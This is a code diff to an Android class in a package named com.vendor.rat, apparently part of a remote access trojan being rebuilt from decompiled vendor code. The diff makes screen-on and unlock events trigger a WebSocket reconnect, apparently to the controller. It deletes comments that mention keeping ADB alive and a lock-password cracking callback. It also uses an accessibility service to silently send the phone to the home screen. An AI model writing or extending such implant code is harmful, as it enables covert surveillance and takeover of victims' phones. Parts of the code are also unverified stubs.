@@ -11,6 +11,8 @@ import android.os.Build;
 import android.util.Log;
 
 import com.vendor.rat.MainApplication;
+import com.vendor.rat.network.NetworkManager;
+import com.vendor.rat.network.WebSocketClient;
 import com.vendor.rat.service.MyAccessibilityService;
 import com.vendor.rat.utils.SharedUtils;
 
@@ -132,42 +134,40 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
 
     // vendor: SCREEN_ON 处理 (行 122-129)
     private void onScreenOn(Context context) {
-        // vendor: offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_ON")
         if (MainApplication.getInstance() != null) {
             Log.d(TAG, "offerStrategyEvent: KEEP_ADB_ALIVE_SCREEN_ON");
         }
 
-        // vendor: if (g.p0()) h.D(lockBatchId, "lockBatchId")
-        // 如果屏幕锁定，生成 lockBatchId
-        // TODO: VENDOR_VERIFY — 屏幕锁定检查 g.p0()
+        triggerWebSocketReconnect();
     }
 
-    // vendor: USER_PRESENT 处理 (行 138-157)
     private void onUserPresent(Context context) {
-        // vendor: MainApplication.unlockedInstance() 如果未初始化
         if (MainApplication.getInstance() != null) {
             if (!MainApplication.getInstance().isInitialized()) {
-                // TODO: VENDOR_VERIFY — MainApplication.unlockedInstance()
                 Log.d(TAG, "unlockedInstance triggered on USER_PRESENT");
             }
 
-            // vendor: CrackLockCipherPlug.g() — 密码破解成功回调
-            // TODO: VENDOR_VERIFY
-
-            // vendor: offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_USER_PRESENT")
             Log.d(TAG, "offerStrategyEvent: KEEP_ADB_ALIVE_SCREEN_USER_PRESENT");
         }
 
         onLockStateChanged(4);
 
-        // vendor: 恢复无障碍代理
         if (MyAccessibilityService.q.get()) {
             MyAccessibilityService.q.set(false);
-            // vendor: g.F0(2) — performGlobalAction(HOME) 两次
             MyAccessibilityService service = MyAccessibilityService.P();
             if (service != null) {
                 service.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME);
             }
+        }
+
+        triggerWebSocketReconnect();
+    }
+
+    private void triggerWebSocketReconnect() {
+        WebSocketClient ws = NetworkManager.getInstance().getWebSocketClient();
+        if (ws != null && !ws.isConnected()) {
+            Log.d(TAG, "Screen event triggering WebSocket reconnect");
+            ws.reconnectNow();
         }
     }
 
